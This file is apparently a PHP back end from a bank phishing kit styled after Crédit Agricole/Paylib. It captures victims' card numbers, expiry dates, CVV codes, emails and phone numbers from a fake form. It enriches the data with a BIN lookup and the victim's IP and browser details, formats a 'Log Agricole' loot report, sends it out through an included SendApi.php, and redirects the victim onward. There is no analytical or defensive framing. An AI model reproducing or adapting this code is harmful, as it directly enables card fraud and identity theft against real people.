<?php
error_reporting(0);
session_start();

include("../detect.php"); 
$useragent = $_SERVER['HTTP_USER_AGENT'];
$brow = getBrowser() ;
$sys = getOs();
$ip = getenv("REMOTE_ADDR");
$link = $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'] ;

$InfoDATE   = date("d-m-Y h:i:sa");

$Email = $_SESSION['Email'] = $_POST['Email'];
$cardnumber = $_SESSION['cardnumber'] = $_POST['cardnumber'];
$expdate = $_SESSION['expdate'] = $_POST['expdate'];
$Securitycode = $_SESSION['Securitycode'] = $_POST['Securitycode'];
$phoneNumberv = $_SESSION['phoneNumber'] = $_POST['phoneNumber'];


$bincheck = $_POST['cardnumber'] ;
$bincheck = preg_replace('/\s/', '', $bincheck);


$bin = $_POST['cardnumber'] ;
$bin = preg_replace('/\s/', '', $bin);
$bin = substr($bin,0,8);
$url = "https://lookup.binlist.net/".$bin;
$headers = array();
$headers[] = 'Accept-Version: 3';
$ch = curl_init();  
curl_setopt($ch,CURLOPT_URL,$url);
curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$resp=curl_exec($ch);
curl_close($ch);
$xBIN = json_decode($resp, true);

$_SESSION['bank_name'] = $xBIN["bank"]["name"];
$_SESSION['bank_scheme'] = strtoupper($xBIN["scheme"]);
$_SESSION['bank_type'] = strtoupper($xBIN["type"]);
$_SESSION['bank_brand'] = strtoupper($xBIN["brand"]);




$yagmai .= '
[π³ CC Number] = '.$_SESSION['cardnumber'].'
[π Expiry Date ] = '.$_SESSION['expdate'].'
[π (CVV)] = '.$_SESSION['Securitycode'].'
[π€ CardHolder Email] = '.$_SESSION['Email'].'
[β Phone] = '.$_SESSION['phoneNumber'].'
        [+]ββββγπ³ Binγβββ[+]
[π Card Bank] = '.$_SESSION['bank_name'].' 
[π³ Card type] = '.$_SESSION['bank_type'].' 
[π³ Card brand] = '.$_SESSION['bank_brand'].' 
       [+]ββββγπ» Systemγβββ[+]
[π IP INFO] = http://www.geoiptool.com/?IP='.$_SERVER['REMOTE_ADDR'].'
[β° TIME/DATE] ='.$InfoDATE.'
[π BROWSER] = '.$brow.' and '.$sys.'
[π FINGERPRINT] = '.$useragent.'
';



$yagmail .= '
[+]ββββββββββββββββββγ Log Agricole γββββββββββββββββββββ[+]
[+]ββββββββββββββββγπ³ CC INFOγβββββββββββββββββββ[+]
[π³ CC Number] = '.$_SESSION['cardnumber'].'
[π Expiry Date ] = '.$_SESSION['expdate'].'
[π (CVV)] = '.$_SESSION['Securitycode'].'
[π€ CardHolder Email] = '.$_SESSION['Email'].'
[β Phone] = '.$_SESSION['phoneNumber'].'
[+]ββββββββββββββββγπ³ Bin INFOγββββββββββββββββββ[+]
[π Card Bank]          = '.$_SESSION['bank_name'].' 
[π³ Card type]          = '.$_SESSION['bank_type'].' 
[π³ Card brand]         = '.$_SESSION['bank_brand'].' 
[+]ββββββββββββββββγπ» System INFOγβββββββββββββββ[+]
[π IP INFO] = http://www.geoiptool.com/?IP='.$_SERVER['REMOTE_ADDR'].'
[β° TIME/DATE] ='.$InfoDATE.'
[π BROWSER] = '.$brow.' and '.$sys.'
[π FINGERPRINT] = '.$useragent.'
[+]ββββββββββββββββββγ End Log γββββββββββββββββββββ[+]
[+]ββββββββββββββγEinstein REZπ€‘πγβββββββββββββββ[+]
';

include("SendApi.php"); 



header('Location: ../load_paylib.php');




?>